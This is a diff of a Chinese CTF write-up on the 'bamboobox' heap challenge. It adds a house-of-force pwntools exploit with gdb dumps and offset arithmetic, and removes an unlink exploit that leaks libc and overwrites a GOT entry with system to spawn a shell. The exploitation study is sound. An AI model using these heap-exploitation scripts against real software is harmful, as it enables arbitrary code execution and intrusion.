@@ -212,49 +212,71 @@ int main(){
 最终的exp
 
 ```
+#coding=utf-8
 from pwn import *
-sh=process('./bamboobox')
-elf=ELF('./bamboobox')
 
-def additem(length,name):
-    sh.recvuntil(':')
-    sh.sendline('2')
-    sh.recvuntil(':')
-    sh.sendline(str(length))
-    sh.recvuntil(':')
-    sh.sendline(name)
+def add(r,length,name):
+    r.recvuntil('Your choice:')
+    r.sendline('2')
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(length)
+    r.recvuntil('Please enter the name of item:')
+    r.sendline(name)
 
-def modify(idx,length,name):
-    sh.recvuntil(':')
-    sh.sendline('3')
-    sh.recvuntil(':')
-    sh.sendline(str(idx))
-    sh.recvuntil(':')
-    sh.sendline(str(length))
-    sh.recvuntil(':')
-    sh.sendline(name)
+def show(r):
+    r.recvuntil('Your choice:')
+    r.sendline('1')
 
-def remove(idx):
-    sh.recvuntil(':')
-    sh.sendline('4')
-    sh.recvuntil(':')
-    sh.sendline(str(idx))
+def change(r,index,length,name):
+    r.recvuntil('Your choice:')
+    r.sendline('3')
+    r.recvuntil('Please enter the index of item:')
+    r.sendline(index)
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(length)
+    r.recvuntil('Please enter the new name of the item:')
+    r.sendline(name)
 
-def show(idx):
-    sh.recvuntil(':')
-    sh.sendline('1')
+def remove(r,index):
+    r.recvuntil('Your choice:')
+    r.sendline('4')
+    r.recvuntil('Please enter the index of item:')
+    r.sendline(index)
 
-magic=0x400d49
-additem(0x30,'aaaa')
-payload=0x30*'a'
-payload+='a'*8+p64(0xffffffffffffffff)		
-modify(0,0x40,payload)			#这里利用一个堆溢出,覆盖topchunk
-off_to_heap_base=-(0x40+0x20)
-malloc_size=off_to_heap_base-0x10
-additem(malloc_size,'aaaa')		#通过计算chunk出现的位置,写出特定大小的malloc
-additem(0x10,p64(magic)*2)		#这里将函数指针覆盖
-sh.sendline('5')				#触发
-sh.interactive()
+#       0x6020c0 <itemlist>
+#       0x400d49 <magic>
+#   gdb-peda$ x/4gx 0x603000
+#   0x603000:	0x0000000000000000	0x0000000000000021
+#   0x603010:	0x0000000000000000	0x0000000000000000
+
+'''
+gdb-peda$ x/44gx 0x0000000000603030
+0x603030:	0x6161616161616161	0x6161616161616161
+0x603040:	0x6161616161616161	0x6161616161616161
+0x603050:	0x6161616161616161	0x6161616161616161
+0x603060:	0x6161616161616161	0xffffffffffffffff
+'''
+
+'''
+bamboo 地址   RAX: 0x603010 --> 0x0
+我们要修改的地址  0x603010
+topchun 地址  0x603060
+计算的结果: 0x603010 - 0x603060 -0x20 = 0x70
+'''
+
+if __name__ =='__main__':
+    magic = 0x400d49
+    r = process('./bamboobox')
+    add(r,str(0x30),'aaaa') # 0
+    payload=0x30*'a'+'a'*8+p64(0xffffffffffffffff)
+    change(r,str(0),str(0x40),payload)			#这里利用一个堆溢出,覆盖topchunk
+                                                # 通过计算chunk出现的位置,写出特定大小的malloc,
+    add(r,str(-0x70),'bbbb')		    # 据说是 减小top chunk指针,这一步很必要
+
+    add(r,str(0x10),p64(magic)*2)		#这里将函数指针覆盖
+    raw_input('#')
+    r.sendline('5')				#触发
+    r.interactive()
 ```
 最终的运行结果
 
@@ -286,72 +308,6 @@ Your choice:this is mortyflag@@
 通过unlink让ptr最终指向的是ptr前面一点的地方，往ptr里面写payload就能够覆盖ptr本身。然后再次往ptr里面写payload，就能实现地址任意写了。
 
 最终的exp
-```
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
-
-r = process('./bamboobox') 
-
-def additem(length,name):
-    r.recvuntil(":")
-    r.sendline("2")
-    r.recvuntil(":")
-    r.sendline(str(length))
-    r.recvuntil(":")
-    r.sendline(name)
-
-def modify(idx,length,name):
-    r.recvuntil(":")
-    r.sendline("3")
-    r.recvuntil(":")
-    r.sendline(str(idx))
-    r.recvuntil(":")
-    r.sendline(str(length))
-    r.recvuntil(":")
-    r.sendline(name)
-
-def remove(idx):
-    r.recvuntil(":")
-    r.sendline("4")
-    r.recvuntil(":")
-    r.sendline(str(idx))
-
-def show():
-    r.recvuntil(":")
-    r.sendline("1")
-
-additem(0x40,"a"*8)
-additem(0x80,"b"*8)
-additem(0x40,"c"*8)
-ptr = 0x6020c8					
-fake_chunk = p64(0) #prev_size		fake_chunk
-fake_chunk += p64(0x41) #size
-fake_chunk += p64(ptr-0x18) #fd
-fake_chunk += p64(ptr-0x10) #bk
-fake_chunk += "c"*0x20
-
-
-fake_chunk += p64(0x40)		#覆盖到下一个chunk
-fake_chunk += p64(0x90)
-modify(0,0x80,fake_chunk)		
-remove(1)					#触发unlink
-
-
-payload = p64(0)*2
-payload += p64(0x40) + p64(0x602068)
-modify(0,0x80,payload)
-show()
-r.recvuntil("0 : ")
-atoi = u64(r.recvuntil(":")[:6].ljust(8,"\x00"))
-libc = atoi - 0x378f0
-print "libc:",hex(libc)
-system = libc + 0x432c0
-modify(0,0x8,p64(system))
-r.recvuntil(":")
-r.sendline("sh")
-r.interactive()
-```
 
 ```
 #coding=utf-8
